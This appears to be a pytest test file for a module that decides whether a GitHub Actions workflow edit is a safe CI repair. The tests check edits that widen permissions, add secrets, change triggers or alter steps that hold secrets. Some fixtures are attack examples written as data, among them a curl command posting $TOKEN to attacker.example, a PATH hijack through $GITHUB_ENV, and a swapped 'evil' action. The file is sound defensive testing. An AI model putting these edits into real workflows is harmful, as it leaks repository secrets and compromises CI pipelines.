"""workflow_safety: a workflow edit is a CI repair only when the trust boundary is unchanged."""

from __future__ import annotations

import builtins
import sys

import pytest
from gptme_contrib_lib import merge_policy
from gptme_contrib_lib.merge_policy import FileChange
from gptme_contrib_lib.workflow_safety import ci_repair_violations

pytest.importorskip("yaml")

PATH = ".github/workflows/test.yml"

BASE = """\
name: Test
on:
  push:
    branches: [master]
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: astral-sh/setup-uv@v5
      - run: make test
        env:
          TOKEN: ${{ secrets.CODECOV_TOKEN }}
      - run: make lint
"""


# No explicit secret and an explicitly disabled implicit token: only this
# credential-free case may receive step-body repairs.
PLAIN = BASE.replace(
    "        env:\n          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n", ""
).replace("permissions:\n  contents: read", "permissions: {}")


def check(head: str, base: str = BASE, path: str = PATH) -> list[str]:
    return ci_repair_violations(path, base, head)


def test_repair_edits_pass_in_a_secret_free_workflow() -> None:
    head = (
        PLAIN.replace("timeout-minutes: 10", "timeout-minutes: 30")
        .replace("actions/checkout@v4", "actions/checkout@v5")
        .replace("run: make lint", "run: make lint LINT_ARGS=--fix")
    )
    assert check(head, base=PLAIN) == []


def test_repair_edits_pass_in_a_secret_bearing_workflow() -> None:
    # A job timeout and an @ref pin are still allowed; only step bodies freeze.
    head = BASE.replace("timeout-minutes: 10", "timeout-minutes: 30").replace(
        "actions/checkout@v4", "actions/checkout@v5"
    )
    assert check(head) == []


def test_unchanged_workflow_passes() -> None:
    assert check(BASE) == []


def test_alias_moving_write_permissions_into_a_job_is_caught() -> None:
    head = BASE.replace(
        "permissions:\n  contents: read\n",
        "permissions: &perms\n  contents: read\nx-write: &w\n  contents: write\n",
    ).replace(
        "    runs-on: ubuntu-24.04\n",
        "    runs-on: ubuntu-24.04\n    permissions: *w\n",
    )
    violations = check(head)
    assert "job `test`: `permissions` changed" in violations


def test_quoted_permissions_key_is_caught() -> None:
    head = BASE.replace(
        "permissions:\n  contents: read", '"permissions":\n  contents: write'
    )
    assert "top-level `permissions` changed" in check(head)


def test_yaml11_boolean_on_key_is_normalized() -> None:
    # PyYAML reads `on:` as True; an equal trigger block must still compare equal,
    # and an added trigger must still be caught.
    assert check(BASE) == []
    head = BASE.replace(
        "  pull_request:\n", "  pull_request:\n  schedule:\n    - cron: '0 0 * * *'\n"
    )
    assert "top-level `on` changed" in check(head)


@pytest.mark.parametrize("event", ["pull_request_target", "workflow_run"])
def test_privileged_triggers_are_refused(event: str) -> None:
    head = BASE.replace("  pull_request:\n", f"  {event}:\n")
    assert f"head workflow triggers on {event}" in check(head)


def test_secret_added_through_step_env_is_caught() -> None:
    head = BASE.replace(
        "          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n",
        "          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n          PAT: ${{ secrets.ADMIN_PAT }}\n",
    )
    assert "secrets/vars references changed" in check(head)


@pytest.mark.parametrize(
    "added",
    [
        "${{ secrets['ADMIN_PAT'] }}",
        '${{ vars["DEPLOY_HOST"] }}',
        "${{ secrets[matrix.name] }}",
        "${{ toJSON(secrets) }}",
    ],
)
def test_secret_added_in_bracket_or_whole_context_form_is_caught(added: str) -> None:
    head = BASE.replace(
        "          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n",
        f"          TOKEN: ${{{{ secrets.CODECOV_TOKEN }}}}\n          PAT: {added}\n",
    )
    assert "secrets/vars references changed" in check(head)


def test_bracket_form_matches_its_dotted_equivalent() -> None:
    head = BASE.replace("secrets.CODECOV_TOKEN", "secrets['CODECOV_TOKEN']")
    # Same reference set; the secret-holding step's text still changed, which the
    # frozen-step rule refuses on its own.
    assert "secrets/vars references changed" not in check(head)
    assert check(head) == ["job `test`: a step changed in a secret-scoped job"]


SECRET_STEP = "job `test`: a step changed in a secret-scoped job"


def test_run_edit_in_a_secret_holding_step_is_caught() -> None:
    head = BASE.replace(
        "run: make test", 'run: curl -d "$TOKEN" https://attacker.example'
    )
    assert SECRET_STEP in check(head)


def test_moving_a_secret_env_entry_to_another_step_is_caught() -> None:
    head = BASE.replace(
        "      - run: make test\n        env:\n          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n"
        "      - run: make lint\n",
        "      - run: make test\n      - run: make lint\n        env:\n"
        "          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n",
    )
    assert head != BASE
    assert SECRET_STEP in check(head)


def test_step_inserted_before_a_secret_holding_step_is_caught() -> None:
    head = BASE.replace(
        "      - run: make test\n",
        "      - run: echo PATH=/tmp/evil >> $GITHUB_ENV\n      - run: make test\n",
    )
    assert SECRET_STEP in check(head)


def test_step_after_the_last_secret_holding_step_is_caught() -> None:
    # A secret reaches later steps through $GITHUB_ENV, outputs and files, so a
    # later step is exfil surface even though the holder is untouched.
    head = BASE + "      - run: make docs\n"
    assert check(head) == [SECRET_STEP]


def test_edit_in_a_job_upstream_of_a_secret_job_is_caught() -> None:
    # `test` holds no secret, but `upload` (which it feeds) does: a `test` step
    # edit can poison the artifact/output `upload` executes with its secret.
    base = PLAIN + (
        "  upload:\n"
        "    needs: test\n"
        "    runs-on: ubuntu-24.04\n"
        "    steps:\n"
        "      - run: ./tools/publish.sh\n"
        "        env:\n"
        "          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n"
    )
    head = base.replace("run: make lint", "run: make lint LINT_ARGS=--fix")
    assert "job `test`: a step changed in a secret-scoped job" in check(head, base=base)
    # The same edit is fine when no job holds a secret.
    assert (
        check(
            PLAIN.replace("run: make lint", "run: make lint LINT_ARGS=--fix"),
            base=PLAIN,
        )
        == []
    )


def test_job_env_secret_freezes_every_step_in_the_job() -> None:
    base = BASE.replace(
        "    timeout-minutes: 10\n",
        "    timeout-minutes: 10\n    env:\n      PAT: ${{ secrets.ADMIN_PAT }}\n",
    )
    head = base.replace("run: make lint", "run: make lint LINT_ARGS=--fix")
    assert check(head, base=base) == [
        "job `test`: a step changed in a secret-scoped job"
    ]


def test_workflow_env_secret_freezes_every_step() -> None:
    base = BASE.replace(
        "permissions:\n", "env:\n  PAT: ${{ secrets.ADMIN_PAT }}\npermissions:\n"
    )
    head = base.replace("run: make lint", "run: make lint LINT_ARGS=--fix")
    assert check(head, base=base) == [
        "job `test`: a step changed in a secret-scoped job"
    ]


def test_inherited_secrets_freeze_steps_in_other_jobs() -> None:
    base = PLAIN + (
        "  call:\n"
        "    needs: test\n"
        "    uses: ./.github/workflows/build.yml\n"
        "    secrets: inherit\n"
    )
    head = base.replace("run: make lint", "run: echo poisoned-artifact")
    assert SECRET_STEP in check(head, base=base)
    assert (
        check(base.replace("timeout-minutes: 10", "timeout-minutes: 20"), base=base)
        == []
    )


@pytest.mark.parametrize(
    "permissions",
    [
        "",  # Unspecified repository defaults are not proof of no token.
        "permissions: read-all\n",
        "permissions: write-all\n",
        "permissions:\n  contents: read\n",
        "permissions:\n  contents: write\n",
        "permissions:\n  id-token: write\n",
    ],
)
def test_implicit_token_freezes_step_bodies(permissions: str) -> None:
    base = PLAIN.replace("permissions: {}\n", permissions)
    head = base.replace("run: make lint", "run: echo '${{ github.token }}'")
    assert SECRET_STEP in check(head, base=base)
    # No step body change: ref and timeout repairs remain possible.
    assert (
        check(base.replace("actions/checkout@v4", "actions/checkout@v5"), base=base)
        == []
    )


def test_job_permissions_override_disabled_workflow_token() -> None:
    base = PLAIN.replace(
        "    runs-on: ubuntu-24.04\n",
        "    permissions:\n      contents: write\n    runs-on: ubuntu-24.04\n",
    )
    assert SECRET_STEP in check(
        base.replace("run: make lint", "run: git push"), base=base
    )


def test_job_can_explicitly_disable_inherited_token_permissions() -> None:
    base = PLAIN.replace("permissions: {}\n", "").replace(
        "    runs-on: ubuntu-24.04\n",
        "    permissions: {}\n    runs-on: ubuntu-24.04\n",
    )
    assert (
        check(base.replace("run: make lint", "run: make lint --fix"), base=base) == []
    )


def test_token_in_another_job_freezes_credential_free_job() -> None:
    base = PLAIN + (
        "  check:\n"
        "    needs: test\n"
        "    permissions:\n      contents: write\n"
        "    runs-on: ubuntu-24.04\n"
        "    steps:\n      - run: make check\n"
    )
    assert SECRET_STEP in check(
        base.replace("run: make lint", "run: echo poison"), base=base
    )


MATRIX_BASE = BASE.replace(
    "    runs-on: ubuntu-24.04\n",
    "    strategy:\n      matrix:\n        os: [ubuntu-24.04]\n"
    "    runs-on: ${{ matrix.os }}\n",
)


def test_matrix_retargeting_runs_on_is_caught() -> None:
    head = MATRIX_BASE.replace("os: [ubuntu-24.04]", "os: [self-hosted]")
    assert "job `test`: `strategy` changed" in check(head, base=MATRIX_BASE)


@pytest.mark.parametrize(
    ("key", "block"),
    [
        ("env", "    env:\n      MODE: ci\n"),
        ("defaults", "    defaults:\n      run:\n        shell: bash\n"),
        ("concurrency", "    concurrency: test\n"),
    ],
)
def test_job_level_trust_keys_are_compared(key: str, block: str) -> None:
    head = BASE.replace(
        "    timeout-minutes: 10\n", "    timeout-minutes: 10\n" + block
    )
    assert f"job `test`: `{key}` changed" in check(head)


def test_forbidden_event_names_in_trigger_filters_are_not_events() -> None:
    base = BASE.replace("branches: [master]", "branches: [workflow_run]")
    head = base.replace("timeout-minutes: 10", "timeout-minutes: 20")
    assert check(head, base=base) == []


def test_runs_on_change_is_caught() -> None:
    head = BASE.replace("runs-on: ubuntu-24.04", "runs-on: self-hosted")
    assert "job `test`: `runs-on` changed" in check(head)


def test_new_job_is_caught() -> None:
    head = (
        BASE
        + "  lint:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: make lint\n"
    )
    assert "job set changed" in check(head)


def test_new_action_repo_is_caught_but_ref_bump_is_not() -> None:
    assert check(BASE.replace("astral-sh/setup-uv@v5", "astral-sh/setup-uv@v6")) == []
    head = BASE.replace("astral-sh/setup-uv@v5", "evil/setup-uv@v5")
    assert "job `test`: action set changed (only @ref may)" in check(head)


@pytest.mark.parametrize(
    "path", [".github/workflows/release.yml", ".github/workflows/deploy-docs.yml"]
)
def test_privileged_workflow_names_are_always_out(path: str) -> None:
    assert check(BASE, path=path) != []


def test_privileged_job_name_is_out() -> None:
    base = BASE.replace("  test:\n", "  publish:\n")
    assert check(base, base=base) == [
        "job `publish`: release/publish/deploy/sign/pages job"
    ]


@pytest.mark.parametrize("bad", ["not: [valid", "- a list\n", ""])
def test_unparseable_or_non_mapping_fails_closed(bad: str) -> None:
    assert check(bad) != []
    assert check(BASE, base=bad) != []


def test_missing_parser_fails_closed(monkeypatch: pytest.MonkeyPatch) -> None:
    real_import = builtins.__import__

    def no_yaml(name: str, *args, **kwargs):  # type: ignore[no-untyped-def]
        if name == "yaml":
            raise ImportError(name)
        return real_import(name, *args, **kwargs)

    monkeypatch.delitem(sys.modules, "yaml", raising=False)
    monkeypatch.setattr(builtins, "__import__", no_yaml)
    assert check(BASE) == ["YAML parser unavailable"]


class _Classifier:
    def is_sensitive_path(self, path: str) -> bool:
        return False

    def is_lockfile(self, path: str) -> bool:
        return False

    def is_test_file(self, path: str) -> bool:
        return False

    def is_doc_file(self, path: str) -> bool:
        return False

    def is_spec_like_doc(self, path: str) -> bool:
        return False


ALLOWED = r"^(tests?|lint|ci)\.ya?ml$"


@pytest.mark.parametrize(
    ("change", "policy", "expected"),
    [
        # The shipped policy has no ci_allowed_name: verified or not, still ci-other.
        (FileChange(PATH, ci_safe=True), {}, "ci-other"),
        (FileChange(PATH, ci_safe=None), {"ci_allowed_name": ALLOWED}, "ci-other"),
        (FileChange(PATH, ci_safe=False), {"ci_allowed_name": ALLOWED}, "ci-other"),
        (FileChange(PATH, ci_safe=True), {"ci_allowed_name": ALLOWED}, "ci"),
        (
            FileChange(".github/workflows/build.yml", ci_safe=True),
            {"ci_allowed_name": ALLOWED},
            "ci-other",
        ),
        (
            FileChange(".github/actions/x/test.yml", ci_safe=True),
            {"ci_allowed_name": ALLOWED},
            "ci-other",
        ),
    ],
)
def test_file_class_ci_needs_verification_and_policy_name(
    change: FileChange, policy: dict, expected: str
) -> None:
    assert merge_policy.file_class(change, policy, _Classifier()) == expected


def test_shipped_policy_keeps_every_workflow_ci_other() -> None:
    policy = merge_policy.load_policy(merge_policy.POLICY_PATH)
    assert "ci_allowed_name" not in policy
    change = FileChange(PATH, ci_safe=True)
    assert merge_policy.file_class(change, policy, _Classifier()) == "ci-other"
